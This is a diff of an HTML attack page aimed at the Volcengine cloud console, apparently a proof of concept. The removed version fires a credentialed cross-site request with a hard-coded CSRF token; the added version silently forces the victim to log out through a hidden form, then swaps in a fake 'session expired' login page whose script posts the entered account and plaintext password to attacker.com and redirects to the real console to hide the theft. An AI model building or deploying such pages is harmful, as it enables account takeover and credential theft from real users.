@@ -1,20 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head>
+    <title>会话已过期</title>
+</head>
 <body>
-  <p>页面加载中...</p>
-  <script>
-    fetch('https://console.volcengine.com/api/passport/security/encCerts', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-CSRF-TOKEN': '8b13c7ddf17a645320fff792b453c01c'
-      },
-      body: '{}'
-    }).then(r => r.text())
-      .then(data => console.log(data))
-      .catch(err => console.error('Error:', err));
-  </script>
+    <!-- 隐藏 iframe 用于登出 -->
+    <iframe name="logout_frame" style="display:none;"></iframe>
+    <form action="https://console.volcengine.com/api/passport/login/logout"
+          method="POST" target="logout_frame" id="logoutForm">
+        <input type="hidden" name="x-csrf-token" value="8b13c7ddf17a645320fff792b453c01c">
+    </form>
+
+    <script>// 1. 自动提交登出表单（受害者被强制退出）
+    document.getElementById('logoutForm').submit();
+
+    // 2. 等待 1 秒后，显示伪造的登录页面
+    setTimeout(() => {
+      document.body.innerHTML = `
+        <div style="max-width:400px;margin:100px auto;padding:30px;border:1px solid #ddd;border-radius:8px;font-family:Arial;">
+          <h2>火山引擎控制台</h2>
+          <p style="color:red;">您的会话已过期，请重新登录</p>
+          <input id="username" type="text" placeholder="邮箱/手机号" style="width:100%;padding:10px;margin:10px 0;"><br>
+          <input id="password" type="password" placeholder="密码" style="width:100%;padding:10px;margin:10px 0;"><br>
+          <button onclick="steal()" style="width:100%;padding:10px;background:#0066ff;color:white;border:none;">登录</button>
+        </div>
+      `;
+    }, 1000);
+
+    function steal() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      // 将账号和明文密码发送到攻击者服务器
+      fetch('https://attacker.com/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({account: user, password: pass})
+      });
+      // 模拟跳转到真实官网，消除怀疑
+      window.location.href = 'https://console.volcengine.com';
+    }</script>
 </body>
 </html>
